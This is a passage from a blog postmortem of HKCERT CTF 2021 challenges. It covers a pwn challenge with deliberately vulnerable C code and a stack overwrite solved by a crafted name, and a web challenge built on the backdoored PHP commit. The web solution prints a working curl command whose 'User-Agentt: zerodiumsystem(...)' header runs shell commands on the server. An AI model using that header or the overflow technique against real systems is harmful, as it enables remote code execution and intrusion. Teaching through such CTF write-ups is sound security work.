<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>HKCERT CTF 2021 Postmortem (IV): The Remaining Ones :: Mystify</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="We will cover the remaining challenges I wrote in this part: Flag Checker™, The Wilderness and Potion of Ciphermath.
幫緊你！幫緊你！ / Flag Checker™ (Pwn) Challenge Summary  幫緊你 幫緊你
當無力 堅持集氣幫你
等風向轉天氣
請相信你不死
組隊會撐得起
You will be Ok
You will be Ok
We are here to help validating your flag! Come use our Flag Checker™!
nc HOST PORT When connected to the server, we are asked the name. We are also given 256 attempts to guess the flag." />
<meta name="keywords" content="ctf" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/posts/2021/2021-11-18-hkcert-ctf-4/" />




<link rel="stylesheet" href="/assets/style.css">

  <link rel="stylesheet" href="/assets/mystiz.css">






<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="/img/favicon/mystiz.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="mystiz613" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="HKCERT CTF 2021 Postmortem (IV): The Remaining Ones">
<meta property="og:description" content="We will cover the remaining challenges I wrote in this part: Flag Checker™, The Wilderness and Potion of Ciphermath." />
<meta property="og:url" content="/posts/2021/2021-11-18-hkcert-ctf-4/" />
<meta property="og:site_name" content="Mystify" />

  <meta property="og:image" content="/images/2021-11-18-hkcert-ctf/thumbnail-4.png">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2021-11-18 16:05:03 &#43;0800 &#43;0800" />












  <script data-ad-client="ca-pub-3220069814773012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>


</head>
<body class="mystiz">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Mystify
  </div>
</a>

    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about-me">About Me</a></li>
        
      
        
          <li><a href="/blogroll">Blogroll</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">Show more ▾</li>

          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/crypto-in-ctf">Crypto in CTF</a></li>
              
            
          </ul>
        </ul>
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about-me">About Me</a></li>
      
    
      
        <li><a href="/blogroll">Blogroll</a></li>
      
    
      
        <li><a href="/crypto-in-ctf">Crypto in CTF</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="/posts/2021/2021-11-18-hkcert-ctf-4/">HKCERT CTF 2021 Postmortem (IV): The Remaining Ones</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2021-11-18 
      </span>
    
    
    <span class="post-author">:: Mystiz</span>
    
  </div>

  
  <span class="post-tags">
    
    #<a href="/tags/ctf/">ctf</a>&nbsp;
    
    #<a href="/tags/hkcert-ctf/">hkcert-ctf</a>&nbsp;
    
    #<a href="/tags/challenge-writing/">challenge-writing</a>&nbsp;
    
    #<a href="/tags/web/">web</a>&nbsp;
    
    #<a href="/tags/pwn/">pwn</a>&nbsp;
    
    #<a href="/tags/algorithms/">algorithms</a>&nbsp;
    
  </span>
  

  
    <img src="/images/2021-11-18-hkcert-ctf/thumbnail-4.png" class="post-cover center" alt="HKCERT CTF 2021 Postmortem (IV): The Remaining Ones" />
  

  <div class="post-content js-toc-content"><div>
        <p>We will cover the remaining challenges I wrote in this part: <em>Flag Checker™</em>, <em>The Wilderness</em> and <em>Potion of Ciphermath</em>.</p>

<h2 id="幫緊你幫緊你--flag-checker-pwn">幫緊你！幫緊你！ / Flag Checker™ (Pwn)<a href="#幫緊你幫緊你--flag-checker-pwn" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>

<h3 id="challenge-summary">Challenge Summary<a href="#challenge-summary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>

<blockquote>
<p><em>幫緊你 幫緊你</em><br>
<em>當無力 堅持集氣幫你</em><br>
<em>等風向轉天氣</em><br>
<em>請相信你不死</em><br>
<em>組隊會撐得起</em><br>
<em>You will be Ok</em><br>
<em>You will be Ok</em></p>

<p>We are here to help validating your flag! Come use our Flag Checker™!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc HOST PORT</code></pre></div></blockquote>

<p>When connected to the server, we are asked the name. We are also given 256 attempts to guess the flag. In the each attempt, we are asked to guess the flag (<code>flag</code>) and the MD5 digest of <code>attempt[k]_[guessed_flag]</code> will be stored to <code>ctx.attempts[k]</code>.</p>

<p>After the users has sent their guesses, the server will compute the MD5 digests of <code>attempt00_[flag]</code>, <code>attempt01_[flag]</code>, ..., <code>attemptff_[flag]</code> and check the number of hashes are matched. The flag will be printed if there are over 128 matches. Otherwise, a random digest will be returned.</p>

<p>Well, I know no one could play pwnable without either the binary or the source code. There you go (it is provided to the players along with the binary, too):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;signal.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;time.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;openssl/md5.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> Context Context;

<span style="color:#66d9ef">struct</span> Context {
    <span style="color:#66d9ef">char</span> flag[<span style="color:#ae81ff">64</span>];
    <span style="color:#66d9ef">char</span> hashed_flag[<span style="color:#ae81ff">256</span>][<span style="color:#ae81ff">16</span>];
    <span style="color:#66d9ef">char</span> attempts[<span style="color:#ae81ff">256</span>][<span style="color:#ae81ff">16</span>];
    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">48</span>];
    FILE <span style="color:#f92672">*</span>urandom;
};

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_flag</span>(<span style="color:#66d9ef">int</span> score, Context <span style="color:#f92672">*</span>ctx) {
    <span style="color:#66d9ef">if</span> (score <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">128</span>) {
        printf(<span style="color:#e6db74">&#34;Congratulations, your guess is correct!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        printf(<span style="color:#e6db74">&#34;Please take this shiny flag: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ctx<span style="color:#f92672">-&gt;</span>flag);
    } <span style="color:#66d9ef">else</span> {
        <span style="color:#66d9ef">int</span> random_leak;
        fread(<span style="color:#f92672">&amp;</span>random_leak, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, ctx<span style="color:#f92672">-&gt;</span>urandom);
        random_leak <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xff</span>;
        printf(<span style="color:#e6db74">&#34;No. You scored only %d. Try harder!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, score);
        printf(<span style="color:#e6db74">&#34;I can even tell you one of the hash values: &#34;</span>);
        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>; j<span style="color:#f92672">++</span>) printf(<span style="color:#e6db74">&#34;%02x&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>)ctx<span style="color:#f92672">-&gt;</span>hashed_flag[random_leak][j]);
        printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    }
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">init</span> (Context <span style="color:#f92672">*</span>ctx) {
    FILE <span style="color:#f92672">*</span>fd_flag <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
    <span style="color:#66d9ef">if</span> (fd_flag <span style="color:#f92672">==</span> NULL) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
    <span style="color:#66d9ef">if</span> (fread(ctx<span style="color:#f92672">-&gt;</span>flag, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">47</span>, fd_flag) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">47</span>) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;

    FILE <span style="color:#f92672">*</span>fd_urandom <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;/dev/urandom&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
    <span style="color:#66d9ef">if</span> (fd_urandom <span style="color:#f92672">==</span> NULL) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>;
    ctx<span style="color:#f92672">-&gt;</span>urandom <span style="color:#f92672">=</span> fd_urandom;

    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">read_line</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ptr, <span style="color:#66d9ef">int</span> length) {
    <span style="color:#66d9ef">int</span> real_length <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>, ptr, length);
    <span style="color:#66d9ef">if</span> (ptr[real_length<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>) {
        ptr[real_length<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    }
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sig_handler</span> () {
    printf(<span style="color:#e6db74">&#34;Too slow!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    exit(<span style="color:#ae81ff">1</span>);
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
    <span style="color:#66d9ef">int</span> correct_guesses <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">char</span> tmp[<span style="color:#ae81ff">4096</span>];

    Context ctx;
    MD5_CTX md5_ctx;

    <span style="color:#66d9ef">switch</span> (init(<span style="color:#f92672">&amp;</span>ctx)) {
        <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">break</span>;
        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
            printf(<span style="color:#e6db74">&#34;Cannot read flag.txt</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
            printf(<span style="color:#e6db74">&#34;Cannot read /dev/urandom</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
    }

    printf(<span style="color:#e6db74">&#34;Hello! What is your name? &#34;</span>);
    fflush(stdout);
    read_line(ctx.name, <span style="color:#ae81ff">32</span>);

    printf(<span style="color:#e6db74">&#34;Hey %s. So you are now given 256 tries to guess the flag. I will tell you if have at least 128 correct guesses.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ctx.name);

    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; i<span style="color:#f92672">++</span>) {
        <span style="color:#75715e">// ctx.attempts[i] := md5(prefix + input)
</span><span style="color:#75715e"></span>        printf(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
        fflush(stdout);
        sprintf(tmp, <span style="color:#e6db74">&#34;attempt%02x_&#34;</span>, i);
        read_line(tmp<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">256</span>);
        MD5_Init(<span style="color:#f92672">&amp;</span>md5_ctx);
        MD5_Update(<span style="color:#f92672">&amp;</span>md5_ctx, tmp, strlen(tmp));
        MD5_Final(ctx.attempts[i], <span style="color:#f92672">&amp;</span>md5_ctx);
    }
    
    signal(SIGALRM, sig_handler);
    alarm(<span style="color:#ae81ff">1</span>);

    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; i<span style="color:#f92672">++</span>) {
        sprintf(tmp, <span style="color:#e6db74">&#34;attempt%02x_&#34;</span>, i);
        strcpy(tmp<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span>, ctx.flag);
        MD5_Init(<span style="color:#f92672">&amp;</span>md5_ctx);
        MD5_Update(<span style="color:#f92672">&amp;</span>md5_ctx, tmp, strlen(tmp));
        MD5_Final(ctx.hashed_flag[i], <span style="color:#f92672">&amp;</span>md5_ctx);

        strcpy(tmp, ctx.attempts[i]);

        tmp[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> ctx.hashed_flag[i][<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>strcmp(tmp, ctx.hashed_flag[i])) {
            correct_guesses <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
        }

        <span style="color:#66d9ef">if</span> (correct_guesses <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">128</span>) <span style="color:#66d9ef">break</span>;
    }

    print_flag(correct_guesses, <span style="color:#f92672">&amp;</span>ctx);

    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

<span style="color:#75715e">// gcc -o service service.c -fno-stack-protector -lcrypto
</span></code></pre></div>
<h3 id="motivation">Motivation<a href="#motivation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>

<div class="alert danger" style="margin-bottom: 12px;">
  <strong>😱 Mystiz even writes a pwn challenge?????</strong> I know, I know. This is strange.
</div>


<p>It was a challenge that I intentionally made for Black Bauhinia's internal Attack and Defense. Unfortunately an A&amp;D is very hard to make with only one person and I decided to release it in a jeopardy CTF.</p>

<p>The main point is that I was trying to develop everything <em>on my own</em>. That said, I have to write challenges - and of course a pwnable one. Luckily I was not trying to make an advanced one, or I would need to learn <em>House of [put an arbitrary word here]</em> which probably makes me braindead.</p>

<p>The original version includes far more vulnerabilities because it is expected to be patched during the game.</p>

<ol>
<li>There are less binary protections (PIE is disabled).</li>
<li><code>attempt00_[flag]</code>, <code>attempt01_[flag[1:]]</code>, ..., <code>attempt1f_[flag[31:]]</code> and so on are hashed.</li>
<li>The flag was only 32 characters long.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">36c36
&lt;     if (fread(ctx-&gt;flag, 1, 32, fd_flag) != 32) return 1;
<span style="color:#f92672">---
</span><span style="color:#f92672"></span>&gt;     if (fread(ctx-&gt;flag, 1, 47, fd_flag) != 47) return 1;
95,96d94
&lt;         // ctx.hashed_flag[i] := md5(PREFIX + ctx.flag[(i%32):])
&lt;         int j = i % 32;
98c96
&lt;         strcpy(tmp+10, ctx.flag + j);
<span style="color:#f92672">---
</span><span style="color:#f92672"></span>&gt;         strcpy(tmp+10, ctx.flag);
118c116
&lt; // gcc -o service service.c -no-pie -fno-stack-protector -lcrypto
<span style="color:#f92672">---
</span><span style="color:#f92672"></span>&gt; // gcc -o service service.c -fno-stack-protector -lcrypto
</code></pre></div>
<p>With (2) and (3), we can get hashes of <code>attempt1f_X</code>, <code>attempt3f_X</code>, ... at a chance of $1/32$ upon failing. Since only one byte of the flag is hashed, it could be easily exhaustable. By collecting enough hashes we could recover the flag. Therefore, there are ways to solve the challenge without pwnable skills.</p>

<h3 id="solution">Solution<a href="#solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>

<p>Let's excerpt the source code to show where the weakness is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> Context {
    <span style="color:#66d9ef">char</span> flag[<span style="color:#ae81ff">64</span>];
    <span style="color:#66d9ef">char</span> hashed_flag[<span style="color:#ae81ff">256</span>][<span style="color:#ae81ff">16</span>];
    <span style="color:#66d9ef">char</span> attempts[<span style="color:#ae81ff">256</span>][<span style="color:#ae81ff">16</span>]; <span style="color:#75715e">// 👈 (1)
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">48</span>];
    FILE <span style="color:#f92672">*</span>urandom;
};


<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
    <span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>
    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; i<span style="color:#f92672">++</span>) {
        printf(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
        fflush(stdout);
        sprintf(tmp, <span style="color:#e6db74">&#34;attempt%02x_&#34;</span>, i);
        read_line(tmp<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">256</span>);
        MD5_Init(<span style="color:#f92672">&amp;</span>md5_ctx);
        MD5_Update(<span style="color:#f92672">&amp;</span>md5_ctx, tmp, strlen(tmp));
        MD5_Final(ctx.attempts[i], <span style="color:#f92672">&amp;</span>md5_ctx); <span style="color:#75715e">// 👈 (2)
</span><span style="color:#75715e"></span>    }
    
    <span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>
    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; i<span style="color:#f92672">++</span>) {
        <span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>        strcpy(tmp, ctx.attempts[i]); <span style="color:#75715e">// 👈 (3)
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>        tmp[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> ctx.hashed_flag[i][<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>strcmp(tmp, ctx.hashed_flag[i])) {
            correct_guesses <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
        }
        <span style="color:#66d9ef">if</span> (correct_guesses <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">128</span>) <span style="color:#66d9ef">break</span>;
    }

    <span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>}</code></pre></div>
<p>The root of the problem comes from the sizes of <code>ctx.attempts[i]</code>. Each of them is 16 bytes, which is exactly the size of a MD5 digest.</p>

<p>Suppose that each MD5 digest of <code>attempt[k]_[guessed_flag]</code> consists of <em>no</em> null bytes. <code>ctx.attempts</code> is allocated 4096 bytes, and it consists of no null bytes after 256 rounds of (2) is performed. When the first time (3) is executed, <code>tmp</code> is <em>entirely</em> overwritten by <code>ctx.attempts</code>. Alas, the subsequent memory will be overwritten by <code>ctx.name</code>, too. With IDA, we can see that <code>correct_guesses</code> is 12 bytes after the end of <code>tmp</code>, this is snippeted from the decompiled <code>main</code> function of the binary:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp) {
    <span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>    Context ctx; <span style="color:#75715e">// [rsp-90h] [rbp-3098h]
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> tmp[<span style="color:#ae81ff">4096</span>]; <span style="color:#75715e">// [rsp+1FF0h] [rbp-1018h]
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> i2; <span style="color:#75715e">// [rsp+2FF4h] [rbp-14h] // 👈 The `i` used in the &#34;check&#34; loop
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> i1; <span style="color:#75715e">// [rsp+2FF8h] [rbp-10h] // 👈 The `i` used in the &#34;attempt&#34; loop
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> correct_guesses; <span style="color:#75715e">// [rsp+2FFCh] [rbp-Ch]
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>}</code></pre></div>
<p>From above, <code>name[12:16]</code> overwrites <code>correct_guesses</code>. We can simply change that to a number higher than 128. Note that <code>name[4:8]</code> overwrites <code>i2</code>, which is the <code>i</code> for <code>ctx.hashed_flag[i][16] = 0</code>. That said <code>i</code> should be reasonable (for example, <code>-1</code>) so that the program would not crash after running this line. I used 13 <code>FF</code>'s as the name and that gains me the flag.</p>

<h2 id="荊棘海--the-wilderness-web">荊棘海 / The Wilderness (Web)<a href="#荊棘海--the-wilderness-web" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>

<h3 id="challenge-summary-1">Challenge Summary<a href="#challenge-summary-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>

<blockquote>
<p><em>就在回望一刻總有哀</em><br>
<em>世界已不再</em><br>
<em>誰偏偏一再</em><br>
<em>等待 到終於不記得等待</em></p>

<p>Mystiz likes PHP most. He has been programming in PHP at the time PHP 5 was released. Time flies and here comes PHP 8. He decided to craft a Docker image as a sandbox... What can go wrong?</p>

<p><a href="http://HOST:PORT/">http://HOST:PORT/</a></p>
</blockquote>

<p>We are given a PHP file called <code>index.php</code> and a <code>Dockerfile</code>. The below code are their contents, and the goal is to read the flag in the comment of <code>index.php</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">h1</span>&gt;It Works!&lt;/<span style="color:#f92672">h1</span>&gt;
<span style="color:#75715e">&lt;?php // hkcert21{***REDACTED***} ?&gt;</span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dockerfile" data-lang="dockerfile"><span style="color:#66d9ef">ARG</span> DEBIAN_FRONTEND<span style="color:#f92672">=</span>noninteractive

<span style="color:#66d9ef">RUN</span> apt update <span style="color:#f92672">&amp;&amp;</span> apt install -y pkg-config build-essential autoconf bison re2c libxml2-dev libsqlite3-dev wget unzip zlib1g-dev<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> cd /tmp <span style="color:#f92672">&amp;&amp;</span> wget https://github.com/php/php-src/archive/c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>            <span style="color:#f92672">&amp;&amp;</span> unzip c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>            <span style="color:#f92672">&amp;&amp;</span> cd php-src-* <span style="color:#f92672">&amp;&amp;</span> ./buildconf <span style="color:#f92672">&amp;&amp;</span> ./configure --with-zlib <span style="color:#f92672">&amp;&amp;</span> make -j4<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mv /tmp/php-src-c730aa26bd52829a49f2ad284b181b7e82a68d7d/sapi/cli/php /bin<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> rm -rf /tmp/*<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mkdir /var/www/html -p<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> index.php /var/www/html<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">USER</span><span style="color:#e6db74"> www-data</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /var/www/html</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;php&#34;</span>, <span style="color:#e6db74">&#34;-S&#34;</span>, <span style="color:#e6db74">&#34;0.0.0.0:80&#34;</span>, <span style="color:#e6db74">&#34;-t&#34;</span>, <span style="color:#e6db74">&#34;/var/www/html&#34;</span>]</code></pre></div>
<h3 id="solution-1">Solution<a href="#solution-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>

<p>The PHP code is so simple that it is trivially not vulnerable. The weakness comes from <code>Dockerfile</code>, where a backdoored PHP version is used. When we search the commit hash <code>c730aa26bd52829a49f2ad284b181b7e82a68d7d</code>, we can easily find pages mentioning the incident. Black Bauhinia have even shared the news on <a href="https://www.facebook.com/blackb6a/posts/225639876011690">their Facebook page</a>. Well, they made a mistake: The header should be <code>User-Agentt</code> (instead of <code>User-Agent</code>).</p>

<div class="alert warning" style="margin-bottom: 12px;">
  <strong>Are you self-promoting?</strong> Yes! This is yet another shameless self-promotion of our Facebook page. Go like and share.
</div>


<p>One can easily get the flag with a little bit of Googling.</p>




<div class="code-toolbar">
<pre class='language-bash command-line' data-output='3-5' data-user='mystiz' data-host='foci'>
<code class="language-bash">curl http://HOST:28364/ \
    -H &#34;User-Agentt: zerodiumsystem(&#39;cat index.php&#39;);&#34;   
&amp;lt;h1&amp;gt;It Works!&amp;lt;/h1&amp;gt;
&amp;lt;?php // hkcert21{vu1n3r1b1li7ie5_m1gh7_c0m3_fr0m_7h3_5upp1y_ch41n} ?&amp;gt;
&amp;lt;h1&amp;gt;It Works!&amp;lt;/h1&amp;gt;</code>
</pre>
</div>

<h3 id="making-of">Making Of<a href="#making-of" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>

<p>Although PHP was the first programming language I ever learned, I never understand how the PHP environment is set up. I was relying on softwares like <em>WampServer</em>. This time I crafted the Docker environment entirely by myself, learning the process of building the PHP environment from source code.</p>

<p>This is the first edition of the Dockerfile I made. I can serve PHP pages, but it is not vulnerable to the backdoor.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dockerfile" data-lang="dockerfile"><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> ubuntu:focal-20210827</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ARG</span> DEBIAN_FRONTEND<span style="color:#f92672">=</span>noninteractive

<span style="color:#66d9ef">RUN</span> apt update<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt install -y pkg-config build-essential autoconf bison re2c libxml2-dev libsqlite3-dev wget unzip<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> cd /tmp <span style="color:#f92672">&amp;&amp;</span> wget https://github.com/php/php-src/archive/c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip <span style="color:#ae81ff">\
